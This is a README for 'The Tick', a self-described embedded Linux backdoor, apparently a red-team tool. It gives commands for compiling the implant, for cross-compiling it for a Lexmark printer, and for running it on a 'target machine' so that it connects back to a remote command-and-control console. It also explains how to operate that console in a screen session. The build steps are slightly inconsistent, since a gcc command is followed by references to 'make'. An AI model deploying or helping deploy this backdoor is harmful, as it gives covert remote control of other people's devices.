# The Tick

A simple embedded Linux backdoor.


## Compiling

```
cd src
gcc -static ./*.h ./*.c -o ./ticksvc
```

Once the "make" command has run to completion, the compiled binary can be found at the "bin" folder. This is the binary you want to run on your target machine to control it remotely.

When cross-compiling for supported platforms, the dependency resolution and compilation is done automatically for you. Currently the only supported cross-compiling platform is the Lexmark CX310DN printer, but more devices will be added later. Consult the makefile for more details.

The command and control console is written in Python and therefore needs not be compiled.

## Installing

Obtaining persistence on the backdoor will depend heavily on the target platform, and therefore is not documented here.

On the target machine, run the backdoor binary with the following arguments:

```
./ticksvc ADDR PORT
```

Where "ADDR" and "PORT" must be replaced by the IP address and port where the command and console will be listening. The default port is 5555.

The command and control console requires no installation, but may have unresolved dependencies. Run the following command to ensure all dependencies are properly installed (note this does not need sudo):

```
pip install --upgrade -r requirements.txt
```

## Usage

To run the backdoor binary on the target platform, set the control server hostname and port as command line options. For example:

```
./ticksvc IP 5555
```

At the control server, you may want to run the console inside a GNU screen instance or similar:

```
sudo apt-get install screen
screen -S thetick ./thetick.py
```

That way you can detach from the console by pressing Control+A followed by D. You can return to the console later like this:

```
screen -r thetick
```

